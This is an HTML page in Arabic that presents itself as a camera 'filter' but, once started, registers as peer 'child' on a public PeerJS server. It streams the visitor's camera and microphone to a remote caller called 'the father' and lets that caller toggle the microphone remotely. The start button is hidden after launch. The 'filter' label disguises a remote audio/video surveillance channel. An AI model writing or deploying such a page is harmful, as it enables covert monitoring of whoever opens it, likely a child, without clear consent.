<!DOCTYPE html>
<html lang="ar">
<head>
<meta charset="UTF-8">
<title> فلتر </title>
</head>
<body>

<h2>: عرض </h2>

<button id="startCam" style="
  padding: 12px 20px;
  font-size: 18px;
  background-color: #28a745;
  color: white;
  border: none;
  border-radius: 8px;
  cursor: pointer;
">
 تشغيل الفلتر
</button>

<script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
<script>
let peer, stream, dataConn;

peer = new Peer("child", {
  host: "peerjs.com",
  secure: true,
  port: 443
});

// زر لتشغيل الكاميرا
document.getElementById("startCam").onclick = () => {
  navigator.mediaDevices.getUserMedia({ video: true, audio: true })
    .then(s => {
      stream = s;
      alert("الكاميرا جاهزة الآن! يمكنك الاتصال بالأب.");

      // الرد على مكالمات الأب
      peer.on("call", call => call.answer(stream));

      // استقبال أوامر الأب
      peer.on("connection", conn => {
        dataConn = conn;
        dataConn.on("data", msg => {
          if(msg.cmd === "switchCamera") alert("أمر تبديل الكاميرا مستقبلاً!");
          if(msg.cmd === "mic") {
            stream.getAudioTracks().forEach(track => track.enabled = !!msg.value);
            alert(msg.value ? "الميكروفون مفعل" : "الميكروفون مكتوم");
          }
        });
      });

      // إخفاء الزر بعد التشغيل
      document.getElementById("startCam").style.display = "none";

    })
    .catch(() => alert("لم يتم السماح بالكاميرا"));
};

// تنظيف الكاميرا عند الخروج
window.onbeforeunload = () => {
  if(stream) stream.getTracks().forEach(t => t.stop());
  peer && peer.destroy();
};
</script>

</body>
</html>
